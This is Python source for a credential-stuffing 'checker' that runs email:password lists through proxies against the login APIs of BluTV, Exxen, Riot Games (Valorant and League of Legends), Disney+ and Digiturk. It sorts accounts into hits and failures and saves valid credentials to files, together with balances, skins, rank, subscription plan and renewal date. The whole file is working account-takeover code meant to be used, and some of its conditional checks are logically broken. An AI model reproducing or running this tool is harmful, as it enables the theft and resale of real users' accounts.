if self.checkername == 'BLUTV':
    client = requests.Session()
    client.proxies = proxy

    headers = {
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
        'appcountry': 'TUR',
        'applanguage': 'tr-TR',
        'appplatform': 'com.blu',
        'content-type': 'text/plain;charset=UTF-8',
        'deviceresolution': '1366x768',
        'origin': 'https://www.blutv.com',
        'referer': 'https://www.blutv.com/giris',
        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    }

    json = {
        'captchaToken': 'CrackTurkey',
        'captchaVersion': 'v3',
        'password': password,
        'remember': 'false',
        'username': email
    }

    response = client.post('https://www.blutv.com/api/login', headers=headers, json=json)


    if 'accessToken' in response.text:

        accessToken = response.json()['accessToken']
        refreshToken = response.json()['refreshToken']
        cookies = {
            'token_a=': accessToken,
            'token_r=': refreshToken
        }

        response1 = client.get('https://www.blutv.com/api/me', cookies=cookies)


        if 'state":"ACTIVE' in response1.text:
            self.lock.acquire()
            pins = client.get('https://www.blutv.com/profil')
            pins = self.findallitem(pins.text, ',"hasPin":', ',"')
            pins = self.listereplace(pins, 'true', 'Var')
            pins = self.listereplace(pins, 'false', 'Yok')
            pins = ",".join(pins)
            self.signal_Screen.emit( f"[HIT] - {email}:{password} - Pin Durumu : {pins}" )
            open('Results\\BluTV\\Hits.txt', 'a').write(f'{email}:{password} - Pin Durumu : {pins}\n')
            self.hits += 1
            self.lock.release()
            return True

        elif 'state":"CANCELLED' or 'state":"NONE' in response1.text:
            self.lock.acquire()
            self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
            open('Results\\BluTV\\Custom.txt', 'a').write(f'{email}:{password}\n')
            self.custom += 1
            self.lock.release()
            return True

    elif 'errors.wrongUsernameOrPassword' or 'errors.validationError' in response.text:
        self.lock.acquire()
        self.signal_Screen.emit( f"[BAD] - {email}:{password}" )
        self.bad += 1
        self.lock.release()
        return True
    
    elif 'Lütfen müşteri hizmetleri ile iletişime geçiniz' in response.text:
        self.lock.acquire()
        self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
        open('Results\\BluTV\\Custom.txt', 'a').write(f'{email}:{password}\n')
        self.custom += 1
        self.lock.release()
        return True
            
elif self.checkername == 'EXXEN':
    client = requests.Session()
    client.proxies = proxy

    headers = {
        'authority': 'www.exxen.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'tr-TR,tr;q=0.6',
        'referer': 'https://www.exxen.com/tr',
        'sec-ch-ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    response = client.get('https://www.exxen.com/tr/sign-in', headers=headers)

    token = self.parse(response.text, 'name="__RequestVerificationToken" type="hidden" value="', '"')

    cookie = {
        'lang': 'tr',
        'csrf': response.cookies['csrf']
    }

    headers = {
        'authority': 'www.exxen.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'tr-TR,tr;q=0.6',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.exxen.com',
        'referer': 'https://www.exxen.com/tr/sign-in',
        'sec-ch-ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    data = {
        '__RequestVerificationToken': token,
        '__reCAPTCHAVerificationToken': '',
        'returnUrl': '',
        'Email': email,
        'Password': password,
        'RememberMe': 'true',
    }

    response = requests.post('https://www.exxen.com/tr/sign-in', cookies=cookie, headers=headers, data=data)

    if '/sign-in' in response.url:
        self.lock.acquire()
        self.signal_Screen.emit( f"[BAD] - {email}:{password}" )
        self.bad += 1
        self.lock.release()
        return True
    
    elif '/order-info' in response.url:
        self.lock.acquire()
        self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
        open('Results\\Exxen\\Custom.txt', 'a').write(f'{email}:{password}\n')
        self.custom += 1
        self.lock.release()
        return True

    elif '/profile/select' in response.url:
        profil = self.parse(response.text, "onclick=\"changeprofile('", "'")

        headers = {
            'authority': 'www.exxen.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'tr-TR,tr;q=0.6',
            'origin': 'https://www.exxen.com',
            'referer': 'https://www.exxen.com/tr/profile/select',
            'sec-ch-ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        client.post(f'https://www.exxen.com/tr/Profile/change?profileId={profil}', headers=headers, cookies=cookie)

        response = client.get('https://www.exxen.com/tr/settings"', headers=headers, cookies=cookie)

        if 'Aktif bir aboneliğiniz bulunmamaktadır' in response.text:
            self.lock.acquire()
            self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
            open('Results\\Exxen\\Custom.txt', 'a').write(f'{email}:{password}\n')
            self.custom += 1
            self.lock.release()
            return True
        
        else:
            self.lock.acquire()
            self.signal_Screen.emit( f"[HIT] - {email}:{password}" )
            open('Results\\Exxen\\Hits.txt', 'a').write(f'{email}:{password}\n')
            self.hits += 1
            self.lock.release()
            return True

elif self.checkername == 'VALORANT':
    client = requests.Session()
    client.proxies = proxy

    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) RiotClient/57.0.0 (CEF 74) Safari/537.36',
        'Cache-Control': 'no-cache',
        'Content-Type': 'application/json',
        'Cookie': 'CrackTurkey',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate',
    }

    data = '{"acr_values" : "","claims" : "","client_id" : "riot-client","code_challenge" : "","code_challenge_method" : "","nonce" : "x04ttP0otE3_SivHJmPT-Q","redirect_uri" : "http://localhost/redirect","response_type" : "token id_token","scope" : "openid link ban lol_region account"}'

    response = client.post('https://auth.riotgames.com/api/v1/authorization', headers=headers, data=data)

    if 'type":"auth' in response.text:
        data = '{"language": "tr_TR","password": "' + password + '","region": null,"remember": false,"type": "auth","username": "' + email + '"}'
        
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) RiotClient/57.0.0 (CEF 74) Safari/537.36',
            'Cache-Control': 'no-cache',
            'Content-Type': 'application/json',
            'Cookie': f"asid={response.cookies['asid']}; clid={response.cookies['clid']}; tdid={response.cookies['tdid']}; __cf_bm={response.cookies['__cf_bm']}",
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
        }

        response = client.put('https://auth.riotgames.com/api/v1/authorization', headers=headers, data=data)
        
        if 'auth_failure' in response.text:
            self.lock.acquire()
            self.signal_Screen.emit( f"[BAD] - {email}:{password}" )
            self.bad += 1
            self.lock.release()
            return True


        elif 'multifactor' in response.text:
            self.lock.acquire()
            self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
            open('Results\\Valorant\\Custom.txt', 'a').write(f'{email}:{password}\n')
            self.custom += 1
            self.lock.release()
            return True

        elif 'access_token' in response.text:
            accesstoken = self.parse(response.text, 'access_token=', '&')
            idtoken = self.parse(response.text, 'id_token=', '&')

            headers = {
                'Host': 'auth.riotgames.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Authorization': f'Bearer {accesstoken}',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate'
            }

            response = client.get('https://auth.riotgames.com/userinfo', headers=headers)

            if 'tag_line":null' in response.text:
                self.lock.acquire()
                self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
                open('Results\\Valorant\\Custom.txt', 'a').write(f'{email}:{password}\n')
                self.custom += 1
                self.lock.release()
                return True

            elif 'scope":"ares"' in response.text or 'scope":"riot"' in response.text:
                self.lock.acquire()
                self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
                open('Results\\Valorant\\Custom.txt', 'a').write(f'{email}:{password}\n')
                self.custom += 1
                self.lock.release()
                return True

            else:
                sub = response.json()['sub']
                tag_line = response.json()['acct']['tag_line']
                sunucu = response.json()['lol']['cpid']
                nick = response.json()['acct']['game_name']
                emailverif = response.json()['email_verified']
                emailverif = str(emailverif).replace('True', '✔️').replace('False', '❌')

                data = '{ "id_token": "' + idtoken + '" }'

                headers = {
                    'user-agent': 'RiotClient/58.0.0.4640299.4552318 rso-auth (Windows;10;;Professional, x64)',
                    'Authorization': f'Bearer {accesstoken}'
                }

                response = client.put('https://riot-geo.pas.si.riotgames.com/pas/v1/product/valorant', headers=headers, data=data)

                live = response.json()['affinities']['live']

                data = '{}'

                headers = {
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50',
                    'Authorization': f'Bearer {accesstoken}',
                    'Content-Type': 'application/json'
                }

                response = client.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, data=data)

                EToken = response.json()['entitlements_token']

                headers = {
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50',
                    'Authorization': f'Bearer {accesstoken}',
                    'X-Riot-Entitlements-JWT': EToken
                }

                response = client.get(f'https://pd.{live}.a.pvp.net/store/v1/wallet/{sub}', headers=headers)
                
                vp = response.json()['Balances']['85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741']
                rp = response.json()['Balances']['e59aa87c-4cbf-517a-5983-6e81511be9b7']

                response = client.get(f'https://pd.{live}.a.pvp.net/store/v1/entitlements/{sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433', headers=headers)

                skinsayısı = response.text.count('ItemID')

                headers = {
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50',
                    'Authorization': f'Bearer {accesstoken}',
                    'X-Riot-Entitlements-JWT': EToken,
                    'X-Riot-ClientPlatform': 'ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9'
                }

                response = client.get(f'https://pd.{live}.a.pvp.net/mmr/v1/players/{sub}/competitiveupdates?startIndex=0&endIndex=20', headers=headers)

                rank = response.json()['Matches'][0]['TierAfterUpdate']
                rank = str(rank)
                
                if '0' == rank:
                    rank = 'Derecesiz'

                elif '3' == rank:
                    rank = 'Demir 1'

                elif '4' == rank:
                    rank = 'Demir 2'

                elif '5' == rank:
                    rank = 'Demir 3'

                elif '6' == rank:
                    rank = 'Bronz 1'

                elif '7' == rank:
                    rank = 'Bronz 2'

                elif '8' == rank:
                    rank = 'Bronz 3'

                elif '9' == rank:
                    rank = 'Gümüş 1'

                elif '10' == rank:
                    rank = 'Gümüş 2'

                elif '11' == rank:
                    rank = 'Gümüş 3'

                elif '12' == rank:
                    rank = 'Altın 1'

                elif '13' == rank:
                    rank = 'Altın 2'

                elif '14' == rank:
                    rank = 'Altın 3'

                elif '15' == rank:
                    rank = 'Platin 1'

                elif '16' == rank:
                    rank = 'Platin 2'

                elif '17' == rank:
                    rank = 'Platin 3'

                elif '18' == rank:
                    rank = 'Elmas 1'
                    
                elif '19' == rank:
                    rank = 'Elmas 2'

                elif '20' == rank:
                    rank = 'Elmas 3'
                    
                elif '21' == rank:
                    rank = 'Yücelik 1'

                elif '22' == rank:
                    rank = 'Yücelik 2'
                    
                elif '23' == rank:
                    rank = 'Yücelik 3'

                elif '24' == rank:
                    rank = 'Ölümsüzlük 1'
                    
                elif '25' == rank:
                    rank = 'Ölümsüzlük 2'
                
                elif '26' == rank:
                    rank = 'Ölümsüzlük 3'
                    
                elif '27' == rank:
                    rank = 'Radyant'

                self.lock.acquire()
                self.signal_Screen.emit( f"[HIT] - {email}:{password} - Nick : {nick}#{tag_line} - Email Doğrulaması : {emailverif} - Sunucu : {sunucu} - VP : {vp} - RP : {rp} - Skin Sayısı : {skinsayısı} - Rank : {rank}\n" )
                open('Results\\Valorant\\Hits.txt', 'a', encoding='UTF-8').write(f'{email}:{password} - Nick : {nick}#{tag_line} - Email Doğrulaması : {emailverif} - Sunucu : {sunucu} - VP : {vp} - RP : {rp} - Skin Sayısı : {skinsayısı} - Rank : {rank}\n')
                self.hits += 1
                self.lock.release()
                return True

elif self.checkername == 'LOL':
    client = requests.Session()
    client.proxies = proxy

    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) RiotClient/57.0.0 (CEF 74) Safari/537.36',
        'Cache-Control': 'no-cache',
        'Content-Type': 'application/json',
        'Cookie': 'CrackTurkey',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate',
    }

    data = '{"acr_values" : "","claims" : "","client_id" : "riot-client","code_challenge" : "","code_challenge_method" : "","nonce" : "x04ttP0otE3_SivHJmPT-Q","redirect_uri" : "http://localhost/redirect","response_type" : "token id_token","scope" : "openid link ban lol_region account"}'

    response = client.post('https://auth.riotgames.com/api/v1/authorization', headers=headers, data=data)

    if 'type":"auth' in response.text:
        data = '{"language": "tr_TR","password": "' + password + '","region": null,"remember": false,"type": "auth","username": "' + email + '"}'
        
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) RiotClient/57.0.0 (CEF 74) Safari/537.36',
            'Cache-Control': 'no-cache',
            'Content-Type': 'application/json',
            'Cookie': f"asid={response.cookies['asid']}; clid={response.cookies['clid']}; tdid={response.cookies['tdid']}; __cf_bm={response.cookies['__cf_bm']}",
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
        }

        response = client.put('https://auth.riotgames.com/api/v1/authorization', headers=headers, data=data)

        if 'auth_failure' in response.text:
            self.lock.acquire()
            self.signal_Screen.emit( f"[BAD] - {email}:{password}" )
            self.bad += 1
            self.lock.release()
            return True


        elif 'multifactor' in response.text:
            self.lock.acquire()
            self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
            open('Results\\LOL\\Custom.txt', 'a').write(f'{email}:{password}\n')
            self.custom += 1
            self.lock.release()
            return True

        elif 'access_token' in response.text:
            accesstoken = self.parse(response.text, 'access_token=', '&')
            idtoken = self.parse(response.text, 'id_token=', '&')

            headers = {
                'Host': 'auth.riotgames.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Authorization': f'Bearer {accesstoken}',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate'
            }

            response = client.get('https://auth.riotgames.com/userinfo', headers=headers)

            if 'tag_line":null' in response.text:
                self.lock.acquire()
                self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
                open('Results\\LOL\\Custom.txt', 'a').write(f'{email}:{password}\n')
                self.custom += 1
                self.lock.release()
                return True

            elif 'scope":"ares"' in response.text or 'scope":"riot"' in response.text:
                self.lock.acquire()
                self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
                open('Results\\LOL\\Custom.txt', 'a').write(f'{email}:{password}\n')
                self.custom += 1
                self.lock.release()
                return True

            else:
                sunucu = response.json()['lol']['cpid']
                nick = response.json()['acct']['game_name']
                tagline = response.json()['acct']['tag_line']
                emailverif = response.json()['email_verified']
                emailverif = str(emailverif).replace('True', '✔️').replace('False', '❌')

                self.lock.acquire()
                self.signal_Screen.emit( f"[HIT] - {email}:{password} - Nick : {nick}#{tagline} - Email Doğrulaması : {emailverif} - Sunucu : {sunucu}\n" )
                open('Results\\LOL\\Hits.txt', 'a', encoding='UTF-8').write(f'{email}:{password} - Nick : {nick}#{tagline} - Email Doğrulaması : {emailverif} - Sunucu : {sunucu}\n')
                self.hits += 1
                self.lock.release()
                return True

elif self.checkername == 'DISNEY':
    client = requests.Session()
    client.proxies = proxy

    guid = uuid.uuid4()

    headers = {
        "X-BAMTech-Password-Reset-Required-Unsupported": "false",
        "X-BAMSDK-Client-ID": "disney-svod-3d9324fc",
        "Accept": "application/json",
        "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2",
        "X-BAMSDK-Platform": "microsoft/uwp/desktop",
        "X-BAMTech-Enhanced-PW-Unsupported": "false",
        "Authorization": "ZGlzbmV5Jm1pY3Jvc29mdCYxLjAuMA.tMplf23ajws2va2_k7qrRKesmERuxIBeCaNiuU5LaeU",
        "X-BAMSDK-Version": "15.1.0",
        "X-BAMSDK-Platform-Id": "uwp-desktop",
        "X-Application-Version": "1.56.2",
        "Content-Type": "application/json",
        "Host": "disney.api.edge.bamgrid.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate"
    }

    data = '{"query":"mutation registerDevice($input: RegisterDeviceInput!) {  registerDevice(registerDevice: $input) {    grant {      grantType      assertion    }  }}","variables":{"input":{"applicationRuntime":"uwp","attributes":{"brand":"SAMSUNG ELECTRONICS CO., LTD.","browserName":null,"browserVersion":null,"manufacturer":"SAMSUNG ELECTRONICS CO., LTD.","model":"355V4C/355V4X/355V5C/355V5X/356V4C/356V4X/356V5C/356V5X/3445VC/3445VX/3545VC/3545VX","operatingSystem":"WINDOWS","operatingSystemVersion":"10.0.19045","osDeviceIds":[{"identifier":"' + str(guid) + '","type":"windows.advertising.id"},{"identifier":"03-00-32-B4-08-00-18-B5-05-00-22-0E-05-00-0E-5E-06-00-01-00-04-00-CC-1D-04-00-84-5E-04-00-84-A1-04-00-5C-A3-04-00-18-D1-01-00-FC-C9-02-00-9E-55-09-00-1A-82","type":"windows.hardware.id"}]},"deviceFamily":"microsoft","deviceLanguage":null,"deviceProfile":"desktop","devicePlatformId":"uwp-desktop","huluUserToken":null,"metadata":null}}}'

    response = client.post('https://disney.api.edge.bamgrid.com/graph/v1/device/graphql', headers=headers, data=data)

    accesstoken = response.json()['extensions']['sdk']['token']['accessToken']

    headers = {
        "X-BAMTech-Password-Reset-Required-Unsupported": "false",
        "X-BAMSDK-Client-ID": "disney-svod-3d9324fc",
        "Accept": "application/json",
        "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2",
        "X-BAMSDK-Platform": "microsoft/uwp/desktop",
        "X-BAMTech-Enhanced-PW-Unsupported": "false",
        "Authorization": accesstoken,
        "X-BAMSDK-Version": "15.1.0",
        "X-BAMSDK-Platform-Id": "uwp-desktop",
        "X-Application-Version": "1.56.2",
        "Content-Type": "application/json",
        "Host": "disney.api.edge.bamgrid.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate"
    }

    data = '{"query":" mutation login($input: LoginInput!) {   login(login: $input) { actionGrant identity {   flows { marketingPreferences {   isOnboarded,   eligibleForOnboarding } personalInfo {   eligibleForCollection   requiresCollection }   }   personalInfo { dateOfBirth gender   } }   } } ","variables":{"input":{"email":"' + email + '","password":"' + password + '","metadata":{"isTest":false}}}}'


    response = requests.post('https://disney.api.edge.bamgrid.com/v1/public/graphql', headers=headers, data=data)

    if 'data":null' in response.text or 'idp.error.identity.bad-credentials' in response.text or 'Bad credentials sent for disney' in response.text:
        self.lock.acquire()
        self.signal_Screen.emit( f"[BAD] - {email}:{password}" )
        self.bad += 1
        self.lock.release()
        return True

    elif 'isSubscriber":false' in response.text:
        self.lock.acquire()
        self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
        open('Results\\Disney\\Custom.txt', 'a').write(f'{email}:{password}\n')
        self.custom += 1
        self.lock.release()
        return True
    
    elif 'isSubscriber":true' in response.text:
        accesstoken2 = response.json()['extensions']['sdk']['token']['accessToken']

        headers = {
            "X-BAMTech-Password-Reset-Required-Unsupported": "false",
            "X-BAMSDK-Client-ID": "disney-svod-3d9324fc",
            "Accept": "application/json",
            "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2",
            "X-BAMSDK-Platform": "microsoft/uwp/desktop",
            "X-BAMTech-Enhanced-PW-Unsupported": "false",
            "Authorization": accesstoken2,
            "X-BAMSDK-Version": "15.1.0",
            "X-BAMSDK-Platform-Id": "uwp-desktop",
            "X-Application-Version": "1.56.2",
            "Content-Type": "application/json",
            "Host": "disney.api.edge.bamgrid.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate"
        }

        data = '{"query":" {   me { account {   attributes { email userVerified locations {   registration { geoIp {   country }   } }   } } identity {   subscriber { ...subscriber   }   attributes { passwordResetRequired   } }   } }  fragment subscriber on Subscriber { doubleBilled doubleBilledProviders overlappingSubscription subscriberStatus subscriptionAtRisk subscriptions { ...subscriberSubscription } }  fragment subscriberSubscription on SubscriberSubscription {   cancellation {   type   restartEligible } groupId id isEntitled partner paymentProvider product {   ...subscriptionProduct } source {   sourceProvider   sourceRef   sourceType   subType } stacking {   overlappingSubscriptionProviders   previouslyStacked   previouslyStackedByProvider   status } state term {   ...subscriptionTerm } canCancel }  fragment subscriptionProduct on SubscriptionProduct { bundle bundleType categoryCodes earlyAccess entitlements { desc id name partner } id name offerId promotionId redeemed { campaignCode redemptionCode voucherCode } sku subscriptionPeriod trial { duration } }  fragment subscriptionTerm on SubscriptionTerm { churnedDate expiryDate isFreeTrial nextRenewalDate pausedDate purchaseDate startDate } "}'

        response = client.post('https://disney.api.edge.bamgrid.com/v1/public/graphql', headers=headers, data=data)

        paket = response.json()['data']['me']['identity']['subscriber']['subscriptions'][0]['product']['name']

        bitistarihi = response.json()['data']['me']['identity']['subscriber']['subscriptions'][0]['term']['nextRenewalDate']

        bitistarihi = datetime.strptime(bitistarihi, "%Y-%m-%dT%H:%M:%S.%fZ")
        bitistarihi = bitistarihi.strftime("%d.%m.%Y")

        self.lock.acquire()
        self.signal_Screen.emit( f"[HIT] - {email}:{password} - Paket : {paket} - Bitiş Tarihi : {bitistarihi}\n" )
        open('Results\\Disney\\Hits.txt', 'a', encoding='UTF-8').write(f'{email}:{password} - Paket : {paket} - Bitiş Tarihi : {bitistarihi}\n')
        self.hits += 1
        self.lock.release()
        return True
            
elif self.checkername == 'DIGITURK':
    client = requests.Session()
    client.proxies = proxy

    data = '{"Username":"' + email + '","Password":"' + password + '","grant_type":"password"}'

    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "init=5AAYcLXf6c6XzwHtnl7WM3ds/n+KSsT0vrMhb6iNG/wU9jZTk5F/qs93k9sO6wfS/Zaj4kJVKoV7rWXbPH1u9IwW3/46FmiL30udpBDZDeBtSb92Hyxgyd3EtchGfsjRnb1BrS1zceym6T67zqOWUSqB6AK6WEe6+g+wyEUSSS4rX/KzXsGy9gDAnBdjCVd1iy6PmoY/TRxtzkpXx+HQHTs8rVLcCeU/heQdMC6FIUgrSswEmCO/Mdz2Vunb0ff//nvUYw5VE7QYJPJIi8292CWesCT/ACYCew3rqQTY1T6ztplk2sDv7AxYwavnIIGvxt7OVuKtBQrgHF6qle4Kc4xl9cagnWntJEmFK//SsTTuBS1fowEE/iTNZ0Tddwrl/+0A8KgqoiER9jBi+EDWk3a2mlhY1qmdK2+WYT80LRsVbrfvFZwcx97SfbVMt0+H27XpoYxQlcjIBZfXIDSbI5W+ZNVj/6OqoFIfa2AnWMs4bxIbIJKymPRdPa9+Kq2PRG8MHEHgoGHmMp56ZVyhfCnFkuUrlohPPPjQgeNDsptlAV9KpWTOBIWR263MKqHRhr1+ZphUGfiyZUiW5J7gp3ccCwNbdaqCL84yzWOIAHg=",
        "Host": "service2-cloud.digiturkplay.com",
        "Origin": "https://smrtlg.digiturkplay.com",
        "Referer": "https://smrtlg.digiturkplay.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.75",
        "sec-ch-ua": "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows"
    }

    response = requests.post('https://service2-cloud.digiturkplay.com/api/v2/Users/Account/Login?rnd=0.9459357493605074', headers=headers, data=data)

    if 'Üyelik ya da Şifre bilgisi geçersiz! Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz' in response.text or 'Email adresiniz geçersiz' in response.text or 'Bağlantı yaptığınız uygulama için uygun üyeliğiniz bulunamamıştır' in response.text or 'Giriş yetkiniz bulunmamaktadır' in response.text or '{"status":200,"error":{"' in response.text:
        self.lock.acquire()
        self.signal_Screen.emit( f"[BAD] - {email}:{password}" )
        self.bad += 1
        self.lock.release()
        return True
    
    elif 'Şifrenizin geçerlilik süresi dolmuştur. Lütfen yeni şifre belirleyiniz' in response.text or ' kodu ile şifrenizi belirleyebilirsiniz' in response.text:
        self.lock.acquire()
        self.signal_Screen.emit( f"[CUSTOM] - {email}:{password}" )
        open('Results\\Digiturk\\Custom.txt', 'a').write(f'{email}:{password}\n')
        self.custom += 1
        self.lock.release()
        return True
    
    elif 'access_token' in response.text:
        self.lock.acquire()
        self.signal_Screen.emit( f"[HIT] - {email}:{password}" )
        open('Results\\Digiturk\\Hits.txt', 'a').write(f'{email}:{password}\n')
        self.hits += 1
        self.lock.release()
        return True
